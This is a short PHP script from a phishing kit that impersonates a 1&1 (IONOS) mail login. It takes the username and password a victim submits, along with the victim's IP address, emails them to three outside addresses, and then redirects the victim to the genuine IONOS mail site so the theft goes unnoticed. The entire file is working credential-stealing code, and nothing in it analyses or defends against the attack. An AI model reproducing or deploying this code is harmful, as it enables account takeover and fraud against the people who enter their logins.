<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------1n1 Login-----------------------\n";
$message .= "userid: ".$_POST['uusr']."\n";
$message .= "pass   : ".$_POST['prrd']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "appleidentify4@protonmail.com,jnkay@protonmail.com,datomedellavedova@gmail.com";
$subject = "Result from One N One";
$headers = "From: 1n1<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://mail.ionos.com");
?>